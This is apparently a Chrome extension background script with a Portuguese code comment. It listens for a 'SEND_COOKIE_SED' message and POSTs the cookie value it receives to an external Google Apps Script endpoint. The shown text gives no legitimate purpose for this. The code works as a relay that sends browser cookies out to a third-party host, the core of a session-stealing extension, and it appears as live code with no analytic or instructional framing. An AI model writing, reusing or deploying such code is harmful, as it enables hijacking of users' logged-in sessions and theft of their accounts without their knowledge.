chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
  if (message.type === "SEND_COOKIE_SED") {
    fetch("https://script.google.com/macros/s/AKfycbzPBOVTP3zo5M1k2TJj4YPUUlzlb82gyKFaYNyfxk8I0gx5MWqBZ9pwLfEmt3qRs0Fg3g/exec", {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({ cookie: message.cookie })
    })
      .then(res => res.text())
      .then(response => sendResponse({ success: true, response }))
      .catch(error => sendResponse({ success: false, error: error.toString() }));
    // Necessário para resposta assíncrona
    return true;
  }
});